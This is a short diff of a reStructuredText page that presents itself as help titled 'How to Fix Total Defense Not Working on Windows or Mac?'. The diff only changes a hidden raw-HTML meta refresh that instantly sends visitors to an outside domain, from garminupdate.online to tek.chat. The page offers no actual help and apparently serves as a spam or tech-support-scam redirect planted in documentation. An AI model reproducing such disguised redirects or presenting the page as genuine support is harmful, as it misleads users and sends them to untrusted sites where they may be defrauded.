@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://tek.chat/">
 
 How to Fix Total Defense Not Working on Windows or Mac?
 ============================================
